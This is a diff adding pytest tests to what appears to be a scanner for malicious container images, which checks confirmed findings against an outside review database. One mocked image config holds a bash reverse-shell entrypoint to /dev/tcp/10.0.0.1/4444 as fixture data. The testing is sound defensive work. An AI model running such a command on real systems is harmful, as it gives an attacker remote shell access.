@@ -9,8 +9,8 @@ from unittest.mock import MagicMock, patch
 
 import pytest
 
-from knorr.hunt import _discover, _is_known_good_publisher, _pull_ref
-from knorr.models import DetectionMethod, ImageFinding
+from knorr.hunt import _discover, _is_known_good_publisher, _osm_cross_check, _pull_ref
+from knorr.models import DetectionMethod, FindingStatus, ImageFinding
 
 # ---------------------------------------------------------------------------
 # _pull_ref  (registry-prefix stripping)
@@ -84,6 +84,52 @@ def test_run_hunt_docker_smoke(tmp_path):
         ret = run_hunt(args)
 
     assert ret == 0
+
+
+def test_run_hunt_downgrades_on_osm_false_positive(tmp_path):
+    """A Tier-1-confirmed finding whose exact image OSM already marked
+    FALSE_POSITIVE (another researcher's verdict) must land as SCREENED in
+    the DB, not CONFIRMED -- the _osm_cross_check wiring, end-to-end."""
+    from knorr.db import Database
+    from knorr.hunt import run_hunt
+
+    manifest_resp = {
+        "mediaType": "application/vnd.docker.distribution.manifest.v2+json",
+        "config": {"digest": "sha256:cfg"},
+        "layers": [],
+    }
+
+    def mock_resolve_manifest(self, ref, **kwargs):
+        from knorr.registry import ManifestResult
+        return ManifestResult(manifest_resp, "sha256:fake", {})
+
+    def mock_get_config(self, ref, manifest):
+        return {"config": {"Entrypoint": ["bash", "-i", ">&", "/dev/tcp/10.0.0.1/4444", "0>&1"],
+                            "Cmd": None, "Env": [], "Labels": {}, "User": ""}, "history": []}
+
+    db_path = tmp_path / "hunt.sqlite"
+    with patch("knorr.hunt.hub_search", return_value=[
+            {"image": "evil/revshell", "publisher": "evil",
+             "pull_count": 1, "source_term": "xmrig"},
+        ]), \
+        patch("knorr.hunt.DockerHubClient.resolve_manifest", mock_resolve_manifest), \
+        patch("knorr.hunt.DockerHubClient.get_config", mock_get_config), \
+        patch("knorr.hunt.OsmClient.container_targets", return_value=[]), \
+        patch("knorr.hunt.OsmClient.existing_resource",
+              return_value={"id": "deadbeef", "status": "false_positive"}), \
+        patch("knorr.hunt.write_findings_csv", return_value=MagicMock(name="out.csv")), \
+        patch("knorr.hunt.write_summary", return_value=MagicMock(name="summary.json")):
+
+        args = _make_args(registry="docker", sources="search", scan=False, db=db_path)
+        ret = run_hunt(args)
+
+    assert ret == 0
+    db = Database.open(db_path)
+    row = db.conn.execute("SELECT status, reasoning FROM image_findings "
+                          "WHERE image='evil/revshell'").fetchone()
+    db.close()
+    assert row["status"] == "screened"
+    assert "FALSE_POSITIVE" in row["reasoning"]
 
 
 # ---------------------------------------------------------------------------
@@ -176,3 +222,59 @@ def test_is_known_good_publisher(image, publisher, expected):
     f = ImageFinding(image=image, publisher=publisher,
                      detection_method=DetectionMethod.HUB_SEARCH)
     assert _is_known_good_publisher(f) is expected
+
+
+# ---------------------------------------------------------------------------
+# _osm_cross_check: a freshly-confirmed finding is cross-checked against
+# OSM's OWN database, an independent researcher's verdict, before we trust
+# our own confirm(). Born from d0whc3r/kali-ssh: a metasploit-framework
+# install line confirmed it locally and it was submitted to OSM before
+# anyone checked whether OSM (or its own reviewers) had an opinion.
+# ---------------------------------------------------------------------------
+
+def _confirmed_finding(image="evil/miner") -> ImageFinding:
+    return ImageFinding(image=image, status=FindingStatus.CONFIRMED, tier="A:cryptojacking",
+                       detection_method=DetectionMethod.HUB_SEARCH, reasoning="CONFIRMED at Tier-1")
+
+
+def test_osm_cross_check_no_hit_leaves_confirmed():
+    f = _confirmed_finding()
+    osm = MagicMock()
+    osm.existing_resource.return_value = None
+    _osm_cross_check(f, osm)
+    assert f.status == FindingStatus.CONFIRMED
+
+
+def test_osm_cross_check_verified_corroborates_and_stays_confirmed():
+    f = _confirmed_finding()
+    osm = MagicMock()
+    osm.existing_resource.return_value = {"id": "abc12345", "status": "verified"}
+    _osm_cross_check(f, osm)
+    assert f.status == FindingStatus.CONFIRMED
+    assert f.evidence["osm_corroboration"]["status"] == "verified"
+    assert "corroborated" in f.reasoning
+
+
+def test_osm_cross_check_false_positive_downgrades_to_screened():
+    f = _confirmed_finding()
+    osm = MagicMock()
+    osm.existing_resource.return_value = {"id": "deadbeef", "status": "false_positive"}
+    _osm_cross_check(f, osm)
+    assert f.status == FindingStatus.SCREENED
+    assert "FALSE_POSITIVE" in f.reasoning
+
+
+def test_osm_cross_check_pending_leaves_confirmed():
+    f = _confirmed_finding()
+    osm = MagicMock()
+    osm.existing_resource.return_value = {"id": "abc", "status": "pending"}
+    _osm_cross_check(f, osm)
+    assert f.status == FindingStatus.CONFIRMED
+
+
+def test_osm_cross_check_fails_open_on_error():
+    f = _confirmed_finding()
+    osm = MagicMock()
+    osm.existing_resource.side_effect = RuntimeError("network down")
+    _osm_cross_check(f, osm)  # must not raise
+    assert f.status == FindingStatus.CONFIRMED
